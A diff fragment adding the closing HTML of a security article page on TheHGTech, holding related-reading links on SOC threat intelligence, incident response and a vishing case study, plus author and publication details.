+                <li><a href="/guides/threat-intelligence-soc.html" style="color: var(--accent-cyan);">Threat
+                        Intelligence for SOC Teams</a> - Detection and hunting strategies</li>
+                <li><a href="/guides/incident-response-automation.html" style="color: var(--accent-cyan);">Incident
+                        Response Automation</a> - Rapid response to social engineering attacks</li>
+                <li><a href="/articles/harvard-phone-phishing-breach-2025.html"
+                        style="color: var(--accent-cyan);">Harvard Vishing Attack Analysis</a> - Related social
+                    engineering case study</li>
+            </ul>
+
+            <div class="article-footer"
+                style="margin-top: 3rem; padding-top: 2rem; border-top: 1px solid var(--border);">
+                <p><strong>Author:</strong> TheHGTech Security Team</p>
+                <p><strong>Published:</strong> January 2, 2026</p>
+                <p><strong>Last Updated:</strong> January 2, 2026</p>
+            </div>
+        </article>
+
+        <!-- Interaction Bar -->
+        <div class="interaction-bar">
+            <div class="like-section">
+                <button class="like-btn" id="likeBtn" onclick="toggleLike()">
+                    <i class="far fa-heart"></i>
+                </button>
+                <span class="like-count" id="likeCount">0</span>
+            </div>
+            <div class="share-section">
+                <button class="share-btn" onclick="shareOnTwitter()"><i class="fab fa-x-twitter"></i></button>
+                <button class="share-btn" onclick="shareOnLinkedIn()"><i class="fab fa-linkedin-in"></i></button>
+                <button class="share-btn" onclick="shareOnReddit()"><i class="fab fa-reddit-alien"></i></button>
+                <button class="share-btn" onclick="copyLink()"><i class="fas fa-link"></i></button>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <p>&copy; 2026 TheHGTech. All rights reserved.</p>
+    </footer>
+
+    <script src="/interaction-bar.js?v=20251207-0041"></script>
+</body>
+
+</html>
